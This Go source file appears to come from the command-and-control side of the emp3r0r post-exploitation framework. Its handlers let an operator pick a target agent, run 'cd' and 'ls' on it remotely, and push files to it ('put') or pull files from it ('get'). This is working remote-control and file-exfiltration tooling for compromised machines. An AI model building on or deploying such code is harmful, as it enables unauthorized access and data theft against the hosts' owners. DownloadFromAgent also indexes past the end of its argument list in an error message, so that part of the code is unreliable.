package cc

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
)

func ChangeAgentWd(cmd string) {
	// target
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := strings.Fields(cmd)
	if len(inputSlice) != 2 {
		CliPrintError("cd <path>")
		return
	}

	// send cmd
	var data agent.MsgTunData
	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = target.Tag
	err := Send2Agent(&data, target)
	if err != nil {
		CliPrintError("ChangeAgentWd: %v", err)
		return
	}
}

func LsAgentFiles(cmd string) {
	// target
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	// send cmd
	var data agent.MsgTunData
	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = target.Tag
	err := Send2Agent(&data, target)
	if err != nil {
		CliPrintError("LsAgentFiles: %v", err)
		return
	}
}

func UploadToAgent(cmd string) {
	// target
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := strings.Fields(cmd)
	// #put file on agent
	if len(inputSlice) != 3 {
		CliPrintError("put <local path> <remote path>")
		return
	}

	if err = PutFile(inputSlice[1], inputSlice[2], target); err != nil {
		CliPrintError("Cannot put %s: %v", inputSlice[2], err)
	}
}

func DownloadFromAgent(cmd string) {
	// target
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := strings.Fields(cmd)
	// #get file from agent
	if len(inputSlice) != 2 {
		CliPrintError("get <remote path>")
		return
	}

	if err = GetFile(inputSlice[1], target); err != nil {
		CliPrintError("Cannot get %s: %v", inputSlice[2], err)
	}
}
